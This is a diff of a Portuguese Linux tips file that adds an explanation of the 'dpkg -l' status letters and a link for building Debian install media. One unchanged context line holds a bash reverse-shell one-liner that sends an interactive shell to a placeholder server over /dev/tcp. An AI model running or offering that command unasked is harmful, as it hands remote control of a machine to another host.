@@ -1267,6 +1267,32 @@ Em outro terminal rode:
 
 agora só rodar apt
 
+### Primeiro campo do dpkg -l
+
+```
+Desired action:
+            u = Unknown
+            i = Install
+            h = Hold
+            r = Remove
+            p = Purge
+
+          Package status:
+            n = Not-installed
+            c = Config-files
+            H = Half-installed
+            U = Unpacked
+            F = Half-configured
+            W = Triggers-awaiting
+            t = Triggers-pending
+            i = Installed
+
+          Error flags:
+            <empty> = (none)
+            R = Reinst-required
+
+```
+
 # Systemd
 <a href="#Dicas-ng">`^`</a>
 
@@ -2926,6 +2952,10 @@ bash -i > /dev/tcp/ip-servidor/3000 0>&1
 ```
 qemu-img convert -f vpc -O raw something.vhd something.raw
 ```
+
+### criando sua mídia ISO de instalação do Debian
+
+https://fai-project.org
 
 # Geral
 <a href="#Dicas-ng">`^`</a>
